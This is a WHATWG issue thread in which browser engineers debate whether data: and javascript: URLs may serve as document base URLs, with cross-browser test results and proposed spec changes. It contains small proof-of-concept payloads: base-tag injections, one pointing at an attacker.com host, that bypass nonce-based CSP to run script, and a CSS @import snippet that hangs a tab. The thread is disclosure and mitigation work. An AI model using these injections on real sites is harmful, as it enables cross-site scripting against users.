body:
What's the reason for restricting it?

If we do this, we need to update quite a number of `/url` tests that rely on manipulating the `base` element to work.

If you can inject a base tag with data:, you can control all script tags with relative paths (in Chrome) and bypass nonce based CSPs.
E.g.: <base href="data:/,-alert(1)/"><script src=x.js nonce=random-123></script>

While I think it makes sense to fix this, it must be noted that the more generic form of this attack (using an attacker controlled domain) would still work.
<base href="//attacker.com"><script src=x.js nonce=random-123></script>
Okay, so the assumption is that an attacker can inject a data URL `<base>`, but not an HTTP URL `<base>`?

I don't think this change has ~any value in preventing XSS. As you both note, the attacker can inject `<base href='https://evil.com/'>`. We accept the risk of the one (which we have to, because I'm pretty sure that cross-origin `<base>` is too widely used to discard), so we accept the risk of the other.

That said, it's not clear to me that it makes sense to include non-network schemes (and particularly non-hierarchical schemes) as potential document base URLs. I'm not suggesting that we remove the resolution rules set up in the URL spec; I am suggesting that we poke at the contours of what we allow for HTML documents. `data:/path` is a totally reasonable (for some definition of "reasonable") URL, and it should have resolution rules. That doesn't mean it should also be usable as a document base URL. :)

The specific thing that triggered this suggestion is actually a mismatch between the way the URL parser handles `data:` URLs, and the way Chrome handles extracting a body from `data:` URLs. That is, `data:/,alert(1)` is parsed as a URL with a scheme of `data:` and a path of `/,alert(1)`, but turns into a resource with a body of `alert(1)` and a type of `/` when fetched. That's somewhat surprising.

I've landed https://codereview.chromium.org/2626243002 in Chrome to gather some metrics.

While we're here, it might also be reasonable to mitigate some dangling markup issues in `target` by restricting its character set to exclude things like `<` and `\r\n`. Let's see what the numbers look like.

@annevk, any thoughts on https://github.com/whatwg/html/issues/2249#issuecomment-271301975? Based on early numbers from the last week or so of Chrome's beta (which is, admittedly not a truly representative sample), `data:` appeared exactly zero times as a base URL.

Also, newlines in `target` appeared 5 times, and `<` 16 times. I'd like to restrict those as well. :)

Not really, that it works seems expected from how the system is designed. Though data URL parsing/interpretation could use some better interoperability and standard here and there.

As for adding defense-in-depth restrictions, it seems reasonable if we can get everyone to implement them. Bit ambivalent on the whole thing myself.

FWIW, based on quick experimentation with https://output.jsbin.com/zucihoraca:

* Safari matches Chrome's behavior
* Edge ignores `data:` inside `<base>` (it tries to request the original resource)
* Firefox allows `data:` URLs in `<base>`, but doesn't request the resulting resource. I haven't dug into the details of why.

I'd like to change Chrome's behavior to align with either Edge or Firefox. Edge's behavior makes more sense to me. If you're ambivalent, that's what I'd prefer to do.
You will also need to test multiple `<base>` elements to see if its ignored or used but then ignored.

All browsers seem to ignore all but the first `<base>` element, as specified.

I should be more clear about what I mean when I say "ignored". The patch to HTML that I'd propose would be something like changing step 3 of https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url to:

> 3. Set element's frozen base URL to document's fallback base URL, if urlRecord is failure, or urlRecord's scheme is `data`, or running "Is base allowed for Document?" on the resulting URL record and document returns "Blocked", and to urlRecord otherwise.

That is, we'd treat `<base href="data:whatever">` just like `<base href="http::::///////not-valid">`. It would have a frozen base url of the document's fallback base url, and we'd ignore any subsequent `<base>` tags.
For what it's worth, the way Firefox handles this (in URL spec terms) is by always setting the "cannot-be-a-base-URL" flag on data: URLs.
Wait, why are we changing web platform tests before we've agreed on what the spec should say here?
Yeah I'm not sure why that happened. @jeffcarp that should not have been merged.
I created https://github.com/whatwg/meta/pull/17 to clarify the CONTRIBUTOR guidelines around this so that it hopefully doesn't happen again.
I guess the problem here was that https://codereview.chromium.org/2685843003 landed before this PR, and tests are automatically upstreamed to web-platform-tests.
I sent a message to blink-dev about this https://groups.google.com/a/chromium.org/d/msg/blink-dev/QIRcSgN9AK4/0JY58rBhCAAJ

Yes, this test change shouldn't have been landed until the spec was updated.  Sorry about this, we're still getting used to our new system encouraging blink developers to land test changes along with their blink patches (which then get automatically merged back to WPT).  We'll work on improving our docs and guidance to reduce mistakes like this.  In the meantime, please feel free to revert anything you feel was landed in error.

We've been talking lots with @jgraham and others about the inevitable conflicts/mistakes like this as we all work to make WPT a first-class part of our engine development process, but we're all optimistic it'll be worth it in the end :-)

/cc @foolip

We've anticipated some mishaps of this sort. Just yesterday I noticed an unexpected test change in https://github.com/servo/servo/commit/8b69e73594647319e95bd0fd36c2addabcee1e5d and it was quickly dealt with, so let's keep learning how to do this together :)

@mikewest, can you write a PR that matches what you'd like to ship, or is it entangled in a bunch of other questions which we have yet to decide on?
@mikewest have you considered Gecko's approach (see https://github.com/whatwg/html/issues/2249#issuecomment-278389515)? That doesn't just affect `<base>` but also `new URL('bar', 'data:/,/foo')` etc.
Gecko's approach would require changing the URL Standard and special casing data URLs in it. That does not seem great.
(And would still leave the hole for javascript URLs, unless we also change the URL Standard for them.)
Right. Can you explain what is bad about it? It's not clear to me. :-)

I don't think we should add more special cases than needed to an algorithm that's intended to be general purpose. Complicating everyone's URL parser because of this issue doesn't seem like it would go over well.

OK, but a little bit later we will come back to stylesheets with a `data:/,stuff` URI ending up with `url()` working when people don't expect it to, etc, etc.

No one actually wants `data:` urls to be base URLs in practice, and allowing it in general but disallowing it in one single special case is pretty weird.

POC of that (works in Opera/Chrome, not in Safari or Firefox)
http://software.hixie.ch/utilities/js/live-dom-viewer/saved/4887

```
<!-- quirks -->
<link rel=stylesheet href="data:/,/**/ @import url('html { background: purple; color:white }');">
This has a purple background if relative URL @import worked against data: base URL.
```

However I think the reason it doesn't work in Safari is that the outer stylesheet isn't applied.
http://software.hixie.ch/utilities/js/live-dom-viewer/saved/4888

Sorry about the test landing in WPT. I was overly excited about Blink's sync for tests, and didn't think about the fact that the thing I was asserting might not be true in other browsers. :(

WRT the behavior we want: I agree with @bzbarsky. It would be nice to block `data:` from being used as a base entirely. I don't think it would be terrible if we also blocked `javascript:`, for that matter. Looking at the URL spec, it seems like an accidental consequence of step 8 of https://url.spec.whatwg.org/#scheme-state that we don't set this flag for URLs like `data:/,...` (because the first character after the `:` is `/`). We would set the flag for `data:text/html,`, so far as I can tell. Likewise `javascript:/**/whatever;`.

With the caveat that I'm pretty sure Chromium doesn't currently support this flag, WDYT about adding a step after the current step 5 which sets the `cannot-be-a-base-URL` flag for `data` and `javascript` (and `about`? (and `blob`?)) schemes? If that's not a reasonable solution, what would you suggest instead?

`about` seems OK to be able to be a base URL.

`blob` also seems OK since if it starts with a slash, that's not a valid origin, so it will never end up as a `blob` URL that will work, unless I'm missing something.

To be clear, I'm personally okay with that, but there's other parties interested in URLs that don't like special casing URL schemes and deviating more from RFC 3986 than strictly necessary. I guess it's better though if we go down this route to close the gap completely.

> it will never end up as a blob URL that will work, unless I'm missing something.

This seems like a reason to prevent it from being used as a base URL.

> `about` seems OK to be able to be a base URL.

Since the same is true here, why not tighten things a bit?

> To be clear, I'm personally okay with that, but there's other parties interested in URLs that don't like special casing URL schemes and deviating more from RFC 3986 than strictly necessary.

Understood. How have you been balancing the various parties involved thus far? Perhaps @bagder has an opinion from curl's perspective?

The other thing we could do is wrap the URL parser (as we already do for blob URLs) and basically reject javascript/data URL records if they don't have the flag set. That might be cleaner. Would have to carefully audit all the callsites though.

I'd like to pick this back up. Both Chrome and Firefox currently ignore `data:` URLs in `<base>`. I'd like to additionally ignore at least `javascript:`. The smallest change to make that happen is whatever the comment in https://github.com/whatwg/html/issues/2249#issuecomment-278292594 would look like in the spec as it exists today. A larger change would be to take Gecko's approach of setting the relevant flag in URL parsing. An even larger change would be to wrap the URL parser and audit callsites.

Given the amount of usage this sees in the wild, I'd suggest that the small, simple solution would be reasonable. Do folks feel strongly about something more robust and cross-cutting?

Note that the moment Firefox would implement a conforming URL parser it would no longer exclude `data:` URLs. Just restricting `<base>` doesn't help with https://github.com/whatwg/html/issues/2249#issuecomment-279721944 (or an equivalent thing for workers). Although maybe those are less concerning than `<base>`?

(We're doing this for defense-in-depth, right?)

`<base href="data:...">` can change the meaning of `<script href="/whatever.js">` in a way that (at least in Chrome) has lead to XSS. I have some anecdotal evidence that folks have discovered similar concerns in `<base href="javascript:...">` (again, at least in Chrome).

I agree that poking at `<base>` wouldn't adjust the base URL for stylesheets, and would allow the weirdness that @zcorpan notes above. I'm also significantly less concerned about that weirdness, as it doesn't lead to script execution in the containing page's origin. :)
And the concern doesn't extend to workers either for that reason? As they always use an opaque origin for `data:` URLs?

Correct. Workers also require script execution in order to get them running in the first place, and if you can already execute script, then defending against obscure XSS vectors in the script that you were already able to run isn't much help. :)
@bzbarsky is a restriction for `<base>` weird but acceptable, or not acceptable?

It seems pretty bizarrely ad-hoc.  We'd need to remember similar restrictions in any case where the platform allows specifying a base URL out-of-band (or just not adding more such cases), for example.

The principled thing here is really to acknowledge that there are types of URLs that make sense as base urls that can support relative URLs and there are types of URLs for which this operation doesn't make sense....

That said, I'd like to step back one second.  The attack described in https://github.com/whatwg/html/issues/2249#issuecomment-353006967 would be just as much of a problem with `<base href="https://evil.com">`, no?  Why is `data:` special there?  If you let someone inject an attacker-controlled `<base>` _and_ you have relative links to scripts, you just lose.

And if the argument is that people have some sort of filtering but were letting through `data:`, then the problem will just reappear if another protocol they didn't think of gets added at any point...
Note Safari seems to have implemented something like this in their latest Tech Preview release.

> POC of that (works in Opera/Chrome, not in Safari or Firefox)
> http://software.hixie.ch/utilities/js/live-dom-viewer/saved/4887
> 
> ```
> <!-- quirks -->
> <link rel=stylesheet href="data:/,/**/ @import url('html { background: purple; color:white }');">
> This has a purple background if relative URL @import worked against data: base URL.
> ```

I just realized that putting the `/**/` at the end instead (in the import url) would result in an infinite recursion of `@import`s, which indeed it seems to do in Chrome (the tab hangs).

```
<!-- quirks -->
<link rel=stylesheet href="data:/, @import url('x /**/');">
Does this hang the browser?
```

@bzbarsky commented on 14 Feb 2017 :
> OK, but a little bit later we will come back to stylesheets with a `data:/,stuff` URI ending up with `url()` working when people don't expect it to, etc, etc.
> 
> No one actually wants `data:` urls to be base URLs in practice, and allowing it in general but disallowing it in one single special case is pretty weird.

I agree with this. What is now implemented in chromium and webkit doesn't solve the CSS case.

Coming back to this, I don't see how the CSS case is a security problem. The `<base>` case is a marginal security problem as it can lead to script execution, assuming the attacker can inject `data:` but not `https:`. Consider that cross-origin scripts could be banned through CSP.

The moment Gecko aligns its URL parser it would also end up being vulnerable to that case.

Given that Chromium and WebKit already implement a mitigation I think we should standardize on that and have Gecko align to prevent it from introducing a novel XSS angle for itself once it aligns its URL parser.

Persuasive enough @zcorpan @mozfreddyb?

(I discovered that a single `url/` test in Interop 2023 leads back to this issue. Currently failing in Chromium and WebKit. https://wpt.fyi/results/url/a-element.html%3Fexclude%3D(file%7Cjavascript%7Cmailto) search for `<#x> against <data:,>`.)

My preference would have been to disallow `data:` etc as base URLs, but it didn't happen. So, at this point, I agree.

For https://github.com/whatwg/html/issues/2249#issuecomment-591378914 maybe we could have a depth limit for `@import`?

Great, I'll work on a PR.

I wonder why the `@import` case doesn't result in recursion in WebKit, but it does seem reasonable to add a check if Chromium's behavior is indeed correct as you could have a website hang without script and I vaguely recall us preventing that in other cases.

In STP I get this message in the console:
> Did not parse stylesheet at 'data:/,%20@import%20url('x%20/**/');' because non CSS MIME types are not allowed for cross-origin stylesheets.

We discussed the CSS issue further on Chat and as a result Simon filed these bugs:

* https://bugs.chromium.org/p/chromium/issues/detail?id=1477672
* https://bugzilla.mozilla.org/show_bug.cgi?id=1850965

No specification change should be needed for that scenario. (The main scenario was fixed in #9665.)
